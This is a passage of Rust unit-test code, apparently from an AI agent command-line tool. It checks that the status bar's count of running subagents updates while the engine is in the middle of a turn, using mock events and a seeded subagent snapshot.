            fork_context: false,
            agent_type: crate::tools::subagent::SubAgentType::General,
            assignment: crate::tools::subagent::SubAgentAssignment::new(
                "probe the tree".to_string(),
                Some("explorer".to_string()),
            ),
            model: "test-model".to_string(),
            nickname: None,
            status: crate::tools::subagent::SubAgentStatus::Running,
            agent_memory: None,
            result: None,
            steps_taken: 0,
            duration_ms: 0,
            from_prior_session: false,
        }
    }

    /// The 🤖 count has to move while the engine is *mid-turn*.
    ///
    /// The engine drains its op channel only between turns (it runs the whole
    /// turn inside `Op::SendMessage`), so a spawn that refreshed the count
    /// through an op left the segment at `🤖0` for the whole time the child
    /// ran. This pumps a real `AgentSpawned` through `pump_turn` with nobody
    /// reading the op channel — the production mid-turn condition.
    #[tokio::test]
    // The env lock serializes env mutation across the test binary; every
    // other holder acquires it only briefly (no blocking), so holding the
    // guard across this await cannot deadlock.
    #[allow(clippy::await_holding_lock)]
    async fn agent_spawn_counts_a_running_child_with_the_engine_mid_turn() {
        let _lock = crate::test_support::lock_test_env();
        let mut mock = crate::core::engine::mock_engine_handle();
        mock.handle.subagent_api =
            std::sync::Arc::new(SeededSubAgents(vec![running_snapshot("child-a")]));

        let mut state = test_repl_state();
        state.engine = Some(mock.handle.clone());

        mock.tx_event
            .send(Event::TurnStarted {
                turn_id: "turn-1".to_string(),
            })
            .await
            .expect("event channel");
        mock.tx_event
            .send(Event::AgentSpawned {
                id: "child-a".to_string(),
                prompt: "probe the tree".to_string(),
            })
            .await
            .expect("event channel");
        mock.tx_event
            .send(Event::TurnComplete {
                usage: Default::default(),
                status: TurnOutcomeStatus::Completed,
                error: None,
                tool_catalog: None,
                base_url: None,
                reported_model: None,
                failed_attempts: Vec::new(),
            })
            .await
            .expect("event channel");

        let exit = pump_turn(&mut state).await.expect("pump");
        assert_eq!(exit, PumpExit::TurnDone);
        assert_eq!(
            state.running_agent_count(),
            1,
            "the child is running — the 🤖 segment must say so"
        );
        assert!(
            mock.rx_op.try_recv().is_err(),
            "the refresh must not ride the engine's op channel"
        );
    }
}
